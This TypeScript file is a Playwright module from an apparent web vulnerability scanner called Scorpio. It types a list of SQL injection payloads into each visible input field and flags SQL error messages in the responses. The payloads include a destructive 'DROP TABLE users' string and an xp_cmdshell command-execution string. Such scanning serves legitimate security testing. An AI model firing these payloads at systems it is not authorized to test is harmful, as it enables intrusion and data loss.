import type { ElementHandle, Page, Response } from "playwright";
import ScorpioModule from "../ScorpioModule";

/**
 * Interface to define the structure of SQL Injection data collected during testing.
 */
interface ISqliData {
    url?: string;
    payload?: string;
    element?: string;
    responseSnippet?: string;
}

/**
 * Base module for detecting SQL Injection vulnerabilities.
 */
class BaseSqliModule extends ScorpioModule {
    /**
     * Stores details about the SQL injection test (payloads and results).
     */
    private _SqliData: ISqliData = {};

    /**
     * List of SQL injection payloads to test input fields.
     */
    private _Payloads: Array<string> = [
        `1' OR '1' = '1`,
        `" OR "1" = "1`,
        `1; DROP TABLE users --`,
        `" OR sleep(5) --`,
        `admin'--`,
        `'; EXEC xp_cmdshell('dir') --`,
        `' UNION SELECT null, version() --`,
        `" OR LENGTH(user()) > 1 --`,
        `" OR IF(1=1, SLEEP(3), 0) --`,
        `1' AND 1=2 UNION SELECT 'test' --`
    ];

    /**
     * Executes the SQL injection module to test for vulnerabilities.
     *
     * @param page - The Playwright page object used for testing.
     *
     * @returns A promise that resolves once the module completes testing.
     */
    public async run(page: Page): Promise<void> {
        try {
            const inputs: Array<ElementHandle> = await page.$$('input');
            for (const input of inputs) {
                if (this.result.positive) {
                    break;
                }

                const isElementVisible: boolean = await input.isVisible();
                if (!isElementVisible) {
                    this.logger('Input element is not visible');
                    continue;
                }

                for (const payload of this._Payloads) {
                    // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
                    if (this.result.positive) {
                        break;
                    }
                    this._SqliData.element = await input.evaluate((el: HTMLInputElement): string => el.outerHTML);
                    this._SqliData.url = page.url();
                    this._SqliData.payload = payload;
                    await input.fill(payload);
                    await page.keyboard.press('Enter');
                    const response: Response | null = await page.waitForResponse((resp): boolean => resp.url() === page.url(), { timeout: 5000 }).catch((): null => null);
                    if (response) {
                        const responseBody: string = await response.text();
                        if (this.isSqlInjectionSuccess(responseBody)) {
                            this.result.positive = true;
                            this._SqliData.responseSnippet = responseBody.slice(0, 500); // Store a snippet of the response
                            this.result.result = this._SqliData;
                            this.critical('SQL Injection detected: %s', JSON.stringify(this._SqliData));
                            break;
                        }
                    }
                    await page.waitForTimeout(1000);
                }
            }
        } catch (e: unknown) {
            this.logger('Error running: %O', e);
        }
    }

    /**
     * Checks if the response body indicates a successful SQL injection.
     *
     * @param responseBody - The response body to analyze.
     *
     * @returns A boolean indicating if SQL injection was successful.
     */
    private isSqlInjectionSuccess(responseBody: string): boolean {
        const errorPatterns: Array<RegExp> = [
            /sql syntax/i,
            /mysql_fetch/i,
            /syntax error/i,
            /unclosed quotation mark/i,
            /ODBC SQL/i,
            /unknown column/i,
            /unterminated string/i,
            /division by zero/i,
            /you have an error in your SQL/i,
            /unexpected end of SQL command/i
        ];
        return errorPatterns.some((pattern): boolean => pattern.test(responseBody));
    }
}

/**
 * Factory function to create an instance of the SQL Injection module.
 *
 * @returns A new instance of the BaseSqliModule.
 */
export default function(): ScorpioModule {
    return new BaseSqliModule();
}
